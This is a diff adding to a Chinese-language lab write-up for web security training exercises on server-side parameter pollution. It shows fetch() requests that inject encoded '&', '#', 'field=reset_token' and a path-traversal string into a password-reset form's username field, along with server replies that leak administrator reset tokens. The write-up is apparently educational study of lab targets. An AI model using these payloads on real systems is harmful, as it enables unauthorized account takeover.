@@ -200,9 +200,101 @@ forgotPwdReady(() => {
 
 嘗試訪問 https://0ac200260456957680e71cd400bd0060.web-security-academy.net/forgot-password?reset_token=1，只得到 `"Invalid token"`
 
-這題我做到這邊就卡關了，後來是參考解答的步驟，但還是覺得有點牽強(?)
+這題我做到這邊就卡關了，後來是參考解答的步驟
 
-<!-- todo-yus 原理 -->
+1. 嘗試注入 (%26) &，新的 querystring key value
+
+```js
+fetch(
+  "https://0ae3004e038405db81d50dc8002f0055.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26a=1",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{ "error": "Parameter is not supported." }
+```
+
+2. 嘗試注入 (%23) #，把 URL 後面的部分截斷
+
+```js
+fetch(
+  "https://0ae3004e038405db81d50dc8002f0055.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%23",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{ "error": "Field not specified." }
+```
+
+3. 嘗試注入 %26field=1
+
+```js
+fetch(
+  "https://0ae3004e038405db81d50dc8002f0055.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26field=1",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{ "type": "ClientError", "code": 400, "error": "Invalid field." }
+```
+
+4. 結合 forgotPassword.js，嘗試注入 %26field=reset_token
+
+```js
+fetch(
+  "https://0ae3004e038405db81d50dc8002f0055.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26field=reset_token",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{ "type": "reset_token", "result": "9957tpfxcpcr9knzp77b7lhjhk50ynut" }
+```
+
+接著訪問 `/forgot-password?reset_token=9957tpfxcpcr9knzp77b7lhjhk50ynut` 就成功通關～
 
 ## Lab: Exploiting server-side parameter pollution in a REST URL
 
@@ -396,6 +488,52 @@ fetch(
 ```
 
 雖然 API Document 有被截斷，但結果真的跟我 exploit 的一樣，第一層是 api
+
+之後就先用正常 UI 操作忘記密碼的方式，這步驟應該是會產生 passwordResetToken，之後再
+
+```js
+fetch(
+  "https://0a8f003e03a95ba5825becdf00a5004b.web-security-academy.net/forgot-password",
+  {
+    headers: {
+      "content-type": "x-www-form-urlencoded",
+    },
+    body: "csrf=VhZqXhbhPXLtHMZh7VD8pNjI06kh8TjV&username=%2F..%2F..%2F..%2F..%2Fapi%2Finternal%2Fv1%2Fusers%2Fadministrator%2Ffield%2FpasswordResetToken%23",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳
+
+```json
+{
+  "type": "passwordResetToken",
+  "result": "33d8nhkg13w2zrxkaf7d0986hvj1oyp0"
+}
+```
+
+這題跟上面一樣，要先觀察 forgotPassword.js 的行為，得知要 retrieve 的欄位是 passwordResetToken
+
+```js
+forgotPwdReady(() => {
+  const queryString = window.location.search;
+  const urlParams = new URLSearchParams(queryString);
+  const resetToken = urlParams.get("reset-token");
+  if (resetToken) {
+    window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
+  } else {
+    const forgotPasswordBtn = document.getElementById("forgot-password-btn");
+    forgotPasswordBtn.addEventListener("click", displayMsg);
+  }
+});
+```
+
+## 小結
+
+這系列的 Labs 讓我對於 API 的邊界測試，或者是說滲透測試，有不一樣的觀點，以前沒有想過可以玩出 server-side parameter pollution 的花樣
 
 ## 參考資料
 
